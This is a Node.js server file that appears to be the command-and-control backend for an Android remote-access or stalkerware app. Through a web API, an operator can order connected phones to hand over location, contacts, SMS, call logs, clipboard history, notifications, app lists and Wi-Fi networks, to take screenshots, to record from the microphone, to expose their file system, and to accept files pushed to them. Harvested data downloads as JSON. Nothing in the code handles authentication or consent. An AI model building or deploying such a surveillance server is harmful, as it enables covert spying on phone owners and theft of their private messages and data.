const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const multer = require('multer');
const fs = require('fs');
const { exec } = require('child_process');
const os = require('os');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Connected devices storage (persistent)
const connectedDevices = new Map();
const deviceHistory = new Map(); // Store device history even when offline
const deviceScreenshots = new Map(); // Store latest screenshots
const deviceClipboard = new Map(); // Store clipboard data
const deviceNotifications = new Map(); // Store notifications
const deviceApps = new Map(); // Store installed apps
const devicePermissions = new Map(); // Store permissions
const deviceWifi = new Map(); // Store wifi networks

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// File upload configuration
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadDir = path.join(__dirname, 'uploads');
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir, { recursive: true });
    }
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    cb(null, `${Date.now()}-${file.originalname}`);
  }
});

const upload = multer({ storage });

// WebSocket connection handling
wss.on('connection', (ws) => {
  console.log('New WebSocket connection');
  
  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      handleDeviceMessage(ws, data);
    } catch (error) {
      console.error('Error parsing message:', error);
    }
  });
  
  ws.on('close', () => {
    // Mark device as offline instead of removing
    for (const [deviceId, device] of connectedDevices.entries()) {
      if (device.ws === ws) {
        // Update device history
        if (deviceHistory.has(deviceId)) {
          const historyDevice = deviceHistory.get(deviceId);
          historyDevice.lastSeen = new Date();
          historyDevice.isOnline = false;
        }
        
        // Keep device in connected list but mark as offline
        device.isOnline = false;
        device.lastSeen = new Date();
        console.log(`Device ${deviceId} went offline`);
        break;
      }
    }
  });
});

function handleDeviceMessage(ws, message) {
  switch (message.type) {
    case 'register':
      const deviceId = message.data.deviceId || `${message.data.deviceName}-${Date.now()}`;
      
      // Store in history
      deviceHistory.set(deviceId, {
        ...message.data,
        id: deviceId,
        firstSeen: deviceHistory.get(deviceId)?.firstSeen || new Date(),
        totalConnections: (deviceHistory.get(deviceId)?.totalConnections || 0) + 1,
      });
      
      connectedDevices.set(deviceId, {
        ws,
        ...message.data,
        id: deviceId,
        lastSeen: new Date(),
        isOnline: true,
        location: null,
        contacts: [],
        files: [],
        sms: { messages: [], error: null },
        callLog: [],
        currentPath: '/storage/emulated/0',
        latestScreenshot: null,
      });
      console.log(`Device registered: ${deviceId}`);
      break;
      
    case 'location_response':
      updateDeviceData(ws, 'location', message.data);
      console.log('Location updated for device');
      break;
      
    case 'contacts_response':
      updateDeviceData(ws, 'contacts', message.data);
      console.log('Contacts updated for device');
      break;
      
    case 'files_response':
      updateDeviceData(ws, 'files', message.data);
      console.log('Files list updated for device');
      break;
      
    case 'directory_response':
      // Handle both files array and files object structure
      const filesData = message.data.files || message.data;
      updateDeviceData(ws, 'files', Array.isArray(filesData) ? filesData : filesData.files || []);
      if (message.data.currentPath) {
        updateDeviceData(ws, 'currentPath', message.data.currentPath);
      }
      console.log('Directory browsed for device');
      break;
      
    case 'sms_response':
      updateDeviceData(ws, 'sms', message.data);
      console.log('SMS updated for device');
      break;
      
    case 'call_log_response':
      updateDeviceData(ws, 'callLog', message.data);
      console.log('Call log updated for device');
      break;
      
    case 'microphone_response':
      handleMicrophoneResponse(ws, message.data);
      console.log('Microphone data received from device');
      break;
      
    case 'clipboard_response':
      handleClipboardResponse(ws, message.data);
      console.log('Clipboard data received from device');
      break;
      
    case 'notifications_response':
      handleNotificationsResponse(ws, message.data);
      console.log('Notifications received from device');
      break;
      
    case 'apps_response':
      handleAppsResponse(ws, message.data);
      console.log('Apps list received from device');
      break;
      
    case 'permissions_response':
      handlePermissionsResponse(ws, message.data);
      console.log('Permissions received from device');
      break;
      
    case 'wifi_response':
      handleWifiResponse(ws, message.data);
      console.log('WiFi networks received from device');
      break;
      
    case 'screenshot_response':
      handleScreenshotResponse(ws, message.data);
      console.log('Screenshot received from device');
      break;
      
    case 'file_download_response':
      // Handle file download - could store temporarily or forward to client
      console.log('File download received for device');
      break;
      
    case 'ping':
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: 'pong' }));
      }
      break;
      
    default:
      // Don't log ping messages as unknown
      if (message.type !== 'ping') {
        console.log('Unknown message type:', message.type);
      }
  }
}

function updateDeviceData(ws, field, data) {
  for (const [deviceId, device] of connectedDevices.entries()) {
    if (device.ws === ws) {
      device[field] = data;
      device.lastSeen = new Date();
      break;
    }
  }
}

function handleScreenshotResponse(ws, data) {
  for (const [deviceId, device] of connectedDevices.entries()) {
    if (device.ws === ws) {
      if (data.imageData) {
        // Store screenshot data
        deviceScreenshots.set(deviceId, {
          data: data.imageData,
          timestamp: new Date(),
          format: data.format || 'png'
        });
        device.latestScreenshot = new Date();
      } else if (data.error) {
        console.error('Screenshot error:', data.error);
        deviceScreenshots.set(deviceId, {
          error: data.error,
          timestamp: new Date()
        });
      }
      break;
    }
  }
}

function handleMicrophoneResponse(ws, data) {
  for (const [deviceId, device] of connectedDevices.entries()) {
    if (device.ws === ws) {
      device.microphoneData = data;
      break;
    }
  }
}

function handleClipboardResponse(ws, data) {
  for (const [deviceId, device] of connectedDevices.entries()) {
    if (device.ws === ws) {
      if (!deviceClipboard.has(deviceId)) {
        deviceClipboard.set(deviceId, []);
      }
      const clipboardHistory = deviceClipboard.get(deviceId);
      clipboardHistory.unshift({
        ...data,
        timestamp: new Date()
      });
      // Keep only last 50 entries
      if (clipboardHistory.length > 50) {
        clipboardHistory.splice(50);
      }
      break;
    }
  }
}

function handleNotificationsResponse(ws, data) {
  for (const [deviceId, device] of connectedDevices.entries()) {
    if (device.ws === ws) {
      if (!deviceNotifications.has(deviceId)) {
        deviceNotifications.set(deviceId, []);
      }
      const notifications = deviceNotifications.get(deviceId);
      if (Array.isArray(data.notifications)) {
        notifications.unshift(...data.notifications.map(n => ({
          ...n,
          receivedAt: new Date()
        })));
        // Keep only last 100 notifications
        if (notifications.length > 100) {
          notifications.splice(100);
        }
      }
      break;
    }
  }
}

function handleAppsResponse(ws, data) {
  for (const [deviceId, device] of connectedDevices.entries()) {
    if (device.ws === ws) {
      deviceApps.set(deviceId, {
        apps: data.apps || [],
        lastUpdated: new Date()
      });
      break;
    }
  }
}

function handlePermissionsResponse(ws, data) {
  for (const [deviceId, device] of connectedDevices.entries()) {
    if (device.ws === ws) {
      devicePermissions.set(deviceId, {
        permissions: data.permissions || [],
        lastUpdated: new Date()
      });
      break;
    }
  }
}

function handleWifiResponse(ws, data) {
  for (const [deviceId, device] of connectedDevices.entries()) {
    if (device.ws === ws) {
      deviceWifi.set(deviceId, {
        networks: data.networks || [],
        currentNetwork: data.currentNetwork || null,
        lastUpdated: new Date()
      });
      break;
    }
  }
}

// API Routes
app.get('/api/devices', (req, res) => {
  // Combine online devices with offline device history
  const allDevices = new Map();
  
  // Add offline devices from history
  for (const [deviceId, historyDevice] of deviceHistory.entries()) {
    allDevices.set(deviceId, {
      id: historyDevice.id,
      deviceName: historyDevice.deviceName,
      brand: historyDevice.brand,
      model: historyDevice.model,
      platform: historyDevice.platform,
      systemVersion: historyDevice.systemVersion,
      lastSeen: historyDevice.lastSeen,
      firstSeen: historyDevice.firstSeen,
      totalConnections: historyDevice.totalConnections,
      isOnline: false,
      location: null,
      contactsCount: 0,
    });
  }
  
  // Override with online devices
  for (const [deviceId, device] of connectedDevices.entries()) {
    allDevices.set(deviceId, {
      id: device.id,
      deviceName: device.deviceName,
      brand: device.brand,
      model: device.model,
      platform: device.platform,
      systemVersion: device.systemVersion,
      lastSeen: device.lastSeen,
      firstSeen: deviceHistory.get(deviceId)?.firstSeen || device.lastSeen,
      totalConnections: deviceHistory.get(deviceId)?.totalConnections || 1,
      isOnline: device.isOnline !== false,
      location: device.location,
      contactsCount: device.contacts.length,
    });
  }
  
  const devices = Array.from(allDevices.values()).map(device => ({
    id: device.id,
    deviceName: device.deviceName,
    brand: device.brand,
    model: device.model,
    platform: device.platform,
    systemVersion: device.systemVersion,
    lastSeen: device.lastSeen,
    firstSeen: device.firstSeen,
    totalConnections: device.totalConnections,
    isOnline: device.isOnline,
    location: device.location,
    contactsCount: device.contactsCount,
  }));
  
  res.json(devices);
});

app.get('/api/devices/:deviceId', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    // Check device history for offline devices
    const historyDevice = deviceHistory.get(req.params.deviceId);
    if (!historyDevice) {
      return res.status(404).json({ error: 'Device not found' });
    }
    
    return res.json({
      id: historyDevice.id,
      deviceName: historyDevice.deviceName,
      platform: historyDevice.platform,
      lastSeen: historyDevice.lastSeen,
      isOnline: false,
      location: null,
      contacts: [],
      sms: { messages: [], error: null },
      callLog: [],
      files: [],
      currentPath: '/storage/emulated/0',
    });
  }
  
  res.json({
    id: device.id,
    deviceName: device.deviceName,
    brand: device.brand,
    model: device.model,
    platform: device.platform,
    systemVersion: device.systemVersion,
    lastSeen: device.lastSeen,
    isOnline: device.isOnline !== false,
    location: device.location,
    contacts: device.contacts,
    sms: device.sms || { messages: [], error: null },
    callLog: device.callLog || [],
    files: device.files || [],
    currentPath: device.currentPath || '/storage/emulated/0',
  });
});

app.post('/api/devices/:deviceId/request-location', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  device.ws.send(JSON.stringify({
    type: 'request_location',
    data: {}
  }));
  
  res.json({ success: true, message: 'Location request sent' });
});

app.post('/api/devices/:deviceId/request-contacts', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  device.ws.send(JSON.stringify({
    type: 'request_contacts',
    data: {}
  }));
  
  res.json({ success: true, message: 'Contacts request sent' });
});

app.post('/api/devices/:deviceId/request-files', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  device.ws.send(JSON.stringify({
    type: 'request_files',
    data: {}
  }));
  
  res.json({ success: true, message: 'Files request sent' });
});

app.post('/api/devices/:deviceId/browse-directory', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  const { path } = req.body;
  
  // Update the device's current path immediately
  device.currentPath = path;
  
  device.ws.send(JSON.stringify({
    type: 'browse_directory',
    data: { path }
  }));
  
  res.json({ success: true, message: 'Directory browse request sent' });
});

app.post('/api/devices/:deviceId/request-sms', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  device.ws.send(JSON.stringify({
    type: 'request_sms',
    data: {}
  }));
  
  res.json({ success: true, message: 'SMS request sent' });
});

app.get('/api/devices/:deviceId/contacts/download', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  // Format contacts similar to web app display
  const formattedContacts = device.contacts.map((contact, index) => ({
    id: contact.id || `contact_${index}`,
    name: contact.name || 'Unknown Contact',
    phoneNumbers: contact.phoneNumbers?.map(phone => ({
      number: phone.number,
      type: phone.label || 'mobile'
    })) || [],
    emails: contact.emails?.map(email => ({
      email: email.email,
      type: email.label || 'personal'
    })) || [],
    displayInfo: {
      primaryPhone: contact.phoneNumbers?.[0]?.number || 'No phone',
      primaryEmail: contact.emails?.[0]?.email || 'No email'
    }
  }));
  
  // Sort contacts alphabetically by name
  formattedContacts.sort((a, b) => a.name.localeCompare(b.name));
  
  const filename = `contacts-${device.deviceName.replace(/[^a-zA-Z0-9]/g, '_')}-${new Date().toISOString().split('T')[0]}.json`;
  
  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
  res.setHeader('Content-Type', 'application/json');
  
  // Create a well-formatted JSON structure
  const exportData = {
    deviceName: device.deviceName,
    deviceInfo: {
      brand: device.brand,
      model: device.model,
      platform: device.platform
    },
    exportDate: new Date().toISOString(),
    totalContacts: formattedContacts.length,
    summary: {
      contactsWithPhone: formattedContacts.filter(c => c.phoneNumbers.length > 0).length,
      contactsWithEmail: formattedContacts.filter(c => c.emails.length > 0).length
    },
    contacts: formattedContacts
  };
  
  res.json(exportData);
});

app.get('/api/devices/:deviceId/sms/download', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const filename = `sms-${device.deviceName.replace(/[^a-zA-Z0-9]/g, '_')}-${new Date().toISOString().split('T')[0]}.json`;
  
  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
  res.setHeader('Content-Type', 'application/json');
  res.json({
    deviceName: device.deviceName,
    exportDate: new Date().toISOString(),
    totalMessages: device.sms?.messages?.length || 0,
    error: device.sms?.error || null,
    messages: device.sms?.messages || []
  });
});

app.get('/api/devices/:deviceId/call-log/download', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const filename = `call-log-${device.deviceName.replace(/[^a-zA-Z0-9]/g, '_')}-${new Date().toISOString().split('T')[0]}.json`;
  
  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
  res.setHeader('Content-Type', 'application/json');
  res.json({
    deviceName: device.deviceName,
    exportDate: new Date().toISOString(),
    totalCalls: device.callLog?.length || 0,
    calls: device.callLog || []
  });
});

app.post('/api/devices/:deviceId/request-call-log', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  device.ws.send(JSON.stringify({
    type: 'request_call_log',
    data: {}
  }));
  
  res.json({ success: true, message: 'Call log request sent' });
});

app.post('/api/devices/:deviceId/download-file', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  const { filePath } = req.body;
  
  device.ws.send(JSON.stringify({
    type: 'download_file',
    data: { filePath }
  }));
  
  res.json({ success: true, message: 'File download request sent' });
});

app.post('/api/devices/:deviceId/screenshot', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  const quality = req.body.quality || 'medium';
  
  device.ws.send(JSON.stringify({
    type: 'take_screenshot',
    data: { quality }
  }));
  
  res.json({ success: true, message: 'Screenshot request sent' });
});

app.get('/api/devices/:deviceId/latest-screenshot', (req, res) => {
  const screenshot = deviceScreenshots.get(req.params.deviceId);
  if (!screenshot) {
    return res.status(404).json({ error: 'No screenshot available' });
  }
  
  if (screenshot.error) {
    return res.status(500).json({ error: screenshot.error });
  }
  
  // Convert base64 to buffer and send as image
  const imageBuffer = Buffer.from(screenshot.data, 'base64');
  res.setHeader('Content-Type', `image/${screenshot.format}`);
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.send(imageBuffer);
});

app.post('/api/devices/:deviceId/start-microphone', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  device.ws.send(JSON.stringify({
    type: 'start_microphone',
    data: { quality: req.body.quality || 'medium' }
  }));
  
  res.json({ success: true, message: 'Microphone start request sent' });
});

app.post('/api/devices/:deviceId/stop-microphone', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  device.ws.send(JSON.stringify({
    type: 'stop_microphone',
    data: {}
  }));
  
  res.json({ success: true, message: 'Microphone stop request sent' });
});

app.get('/api/devices/:deviceId/clipboard', (req, res) => {
  const clipboardData = deviceClipboard.get(req.params.deviceId) || [];
  res.json({ clipboard: clipboardData });
});

app.post('/api/devices/:deviceId/request-clipboard', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  device.ws.send(JSON.stringify({
    type: 'request_clipboard',
    data: {}
  }));
  
  res.json({ success: true, message: 'Clipboard request sent' });
});

app.get('/api/devices/:deviceId/notifications', (req, res) => {
  const notifications = deviceNotifications.get(req.params.deviceId) || [];
  res.json({ notifications });
});

app.post('/api/devices/:deviceId/request-notifications', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  device.ws.send(JSON.stringify({
    type: 'request_notifications',
    data: {}
  }));
  
  res.json({ success: true, message: 'Notifications request sent' });
});

app.get('/api/devices/:deviceId/apps', (req, res) => {
  const appsData = deviceApps.get(req.params.deviceId);
  res.json(appsData || { apps: [], lastUpdated: null });
});

app.post('/api/devices/:deviceId/request-apps', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  device.ws.send(JSON.stringify({
    type: 'request_apps',
    data: {}
  }));
  
  res.json({ success: true, message: 'Apps request sent' });
});

app.get('/api/devices/:deviceId/permissions', (req, res) => {
  const permissionsData = devicePermissions.get(req.params.deviceId);
  res.json(permissionsData || { permissions: [], lastUpdated: null });
});

app.post('/api/devices/:deviceId/request-permissions', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  device.ws.send(JSON.stringify({
    type: 'request_permissions',
    data: {}
  }));
  
  res.json({ success: true, message: 'Permissions request sent' });
});

app.get('/api/devices/:deviceId/wifi', (req, res) => {
  const wifiData = deviceWifi.get(req.params.deviceId);
  res.json(wifiData || { networks: [], currentNetwork: null, lastUpdated: null });
});

app.post('/api/devices/:deviceId/request-wifi', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  device.ws.send(JSON.stringify({
    type: 'request_wifi',
    data: {}
  }));
  
  res.json({ success: true, message: 'WiFi request sent' });
});

app.post('/api/devices/:deviceId/upload-file', upload.single('file'), (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }
  
  // Read file and send to device
  const filePath = req.file.path;
  const fileData = fs.readFileSync(filePath, { encoding: 'base64' });
  const targetPath = req.body.targetPath || '/storage/emulated/0/Download';
  
  device.ws.send(JSON.stringify({
    type: 'upload_file',
    data: {
      fileName: req.file.originalname,
      fileData: fileData,
      targetPath: targetPath,
      mimeType: req.file.mimetype
    }
  }));
  
  // Clean up temporary file
  fs.unlinkSync(filePath);
  
  res.json({
    success: true,
    message: 'File uploaded to device',
    fileName: req.file.originalname,
    size: req.file.size
  });
});

app.post('/api/devices/:deviceId/share-file', (req, res) => {
  const device = connectedDevices.get(req.params.deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (!device.isOnline) {
    return res.status(400).json({ error: 'Device is offline' });
  }
  
  const { filePath } = req.body;
  
  device.ws.send(JSON.stringify({
    type: 'share_file',
    data: { filePath }
  }));
  
  res.json({ success: true, message: 'File share request sent' });
});

// File upload endpoint
app.post('/api/devices/:deviceId/upload', upload.single('file'), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }
  
  res.json({
    success: true,
    filename: req.file.filename,
    originalName: req.file.originalname,
    size: req.file.size,
  });
});

// Serve web interface
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Web interface: http://localhost:${PORT}`);
});